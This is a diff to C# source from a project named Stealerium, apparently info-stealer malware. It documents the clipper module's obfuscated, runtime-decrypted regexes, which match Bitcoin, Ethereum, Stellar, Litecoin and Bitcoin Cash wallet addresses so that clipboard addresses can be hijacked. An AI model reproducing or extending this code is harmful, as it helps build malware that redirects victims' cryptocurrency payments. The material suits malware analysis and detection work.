@@ -4,12 +4,18 @@ using static Stealerium.Modules.Implant.StringsCrypt;
 
 namespace Stealerium.Clipper
 {
+    /// <summary>
+    /// The RegexPatterns class contains encrypted regular expressions for detecting cryptocurrency addresses.
+    /// </summary>
     internal sealed class RegexPatterns
     {
-        // Encrypted regex
+        /// <summary>
+        /// Dictionary of cryptocurrency symbols and their corresponding regular expression patterns.
+        /// The patterns are decrypted at runtime.
+        /// </summary>
         public static readonly Dictionary<string, Regex> PatternsList = new Dictionary<string, Regex>
         {
-            // Bitcoin ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$
+            // Bitcoin (regex: ^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$)
             {
                 "btc",
                 new Regex(Decrypt(new byte[]
@@ -19,7 +25,7 @@ namespace Stealerium.Clipper
                     10, 208, 170, 195, 1
                 }))
             },
-            // Ethereum (?:^0x[a-fA-F0-9]{40}$)
+            // Ethereum (regex: ^0x[a-fA-F0-9]{40}$)
             {
                 "eth",
                 new Regex(Decrypt(new byte[]
@@ -28,7 +34,7 @@ namespace Stealerium.Clipper
                     209, 77, 219, 160, 24, 109, 10, 208, 47, 54
                 }))
             },
-            // Stellar (?:^G[0-9a-zA-Z]{55}$)
+            // Stellar (regex: ^G[0-9a-zA-Z]{55}$)
             {
                 "xlm",
                 new Regex(Decrypt(new byte[]
@@ -37,7 +43,7 @@ namespace Stealerium.Clipper
                     104, 162, 23, 41, 72, 164, 34, 207, 181, 214
                 }))
             },
-            // Litecoin (?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)
+            // Litecoin (regex: ^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)
             {
                 "ltc",
                 new Regex(Decrypt(new byte[]
@@ -47,7 +53,7 @@ namespace Stealerium.Clipper
                     167, 3, 100, 155, 42
                 }))
             },
-            // Bitcoin Cash ^((bitcoincash:)?(q|p)[a-z0-9]{41})
+            // Bitcoin Cash (regex: ^((bitcoincash:)?(q|p)[a-z0-9]{41}$)
             {
                 "bch",
                 new Regex(Decrypt(new byte[]
